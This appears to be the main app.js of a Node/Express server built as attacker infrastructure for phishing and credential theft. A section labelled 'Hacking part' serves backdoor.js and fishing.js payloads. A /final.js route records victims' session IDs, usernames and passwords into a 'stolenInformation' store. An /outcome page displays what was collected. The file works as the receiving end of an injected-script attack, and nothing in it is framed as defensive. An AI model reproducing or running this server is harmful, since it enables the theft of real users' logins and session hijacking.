var express = require('express');
var path = require('path');
var favicon = require('serve-favicon');
var logger = require('morgan');
var cookieParser = require('cookie-parser');
var bodyParser = require('body-parser');

var routes = require('./routes/index');
var users = require('./routes/users');

var stolenInformation = {};

var app = express();

// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'hbs');


app.use(logger('dev'));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

app.use('/', routes);
app.use('/users', users);

/* GET users listing. */
app.get('/outcome', function(req, res, next) {
  console.log(stolenInformation);
  res.render('outcome', { data: stolenInformation });
});



// Hacking part

app.get('/backdoor.js',function(req, res, next){
  console.log('back',req);
  res.sendFile(path.resolve('hacks/backdoor.js'));
});

app.get('/fishing.js',function(req, res, next){
  console.log('back',req);
  if (req.query.session) {
    if (typeof stolenInformation[req.query.session] === 'undefined') {
      res.sendFile(path.resolve('hacks/fishing.js'));
    } else {
      res.send('console.log("Already")');
    }
  }

});

app.get('/final.js',function(req, res, next){
  if (req.query.session) {
    if (typeof stolenInformation[req.query.session] === 'undefined') {
      stolenInformation[req.query.session] = {
        session: req.query.session,
        username: req.query.username,
        password: req.query.password
      }
      res.sendFile(path.resolve('hacks/final.js'));
    } else {
      res.send('console.log("Already")');
    }
  }
});

// end of hacking part

// catch 404 and forward to error handler
app.use(function(req, res, next) {
  var err = new Error('Not Found');
  err.status = 404;
  next(err);
});

// error handlers

// development error handler
// will print stacktrace
if (app.get('env') === 'development') {
  app.use(function(err, req, res, next) {
    res.status(err.status || 500);
    res.render('error', {
      message: err.message,
      error: err
    });
  });
}

// production error handler
// no stacktraces leaked to user
app.use(function(err, req, res, next) {
  res.status(err.status || 500);
  res.render('error', {
    message: err.message,
    error: {}
  });
});





module.exports = app;
